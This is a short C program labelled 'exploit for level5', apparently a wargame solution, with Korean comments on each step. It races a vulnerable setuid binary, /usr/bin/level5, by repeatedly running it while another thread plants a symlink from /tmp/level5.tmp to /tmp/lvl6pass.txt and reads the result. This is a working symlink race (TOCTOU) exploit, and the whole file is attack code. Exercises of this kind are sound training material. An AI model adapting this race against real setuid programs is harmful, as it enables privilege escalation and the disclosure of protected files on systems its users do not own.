/*
 * Author : superdk@hanmail.net
 * DATA : exploit for level5
 * LICENSE : GNU License
 */

#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>

void *exec_cmd( );
void *exec_race( );

int main( )
{
	// 변수 선언
	pthread_t thread1, thread2;
	char *message1 = "Thread 1";
	char *message2 = "Thread 2";
	int iret1, iret2, i;
	// 대상 프로세스를 실행하고 해당 파일과 경쟁할 링크를 생성하는 프로세스의 실행
	// 스레드를 생성
	iret1 = pthread_create( &thread1, NULL, exec_cmd, (void*) message1);
	iret2 = pthread_create( &thread2, NULL, exec_race, (void*) message2);
	// 스레드 종료 대기
	pthread_join( thread1, NULL);
	pthread_join( thread2, NULL);
	printf("Thread 1 returns: %d\n",iret1);
	printf("Thread 2 returns: %d\n",iret2);
	return 0;
}
void *exec_cmd( )
{
	int i;
	for(i=0; i<10; i++) { // 취약한 프로세스를 반복 실행
		system("/usr/bin/level5 &");
		printf("---Execute level5-----\n");
	}
	exit(0);
}
void *exec_race( )
{
	int i;
	system("touch /tmp/lvl6pass.txt"); // 경쟁할 파일 생성
	for(i=0; i<10; i++) { // 경쟁 파일을 공격 대상 파일로 링크 걸기 반복 시도
		system("ln -s /tmp/lvl6pass.txt /tmp/level5.tmp &");
		printf("===Successfully create link !!!===\n");
		system("cat /tmp/lvl6pass.txt");
	}
	exit(0);
}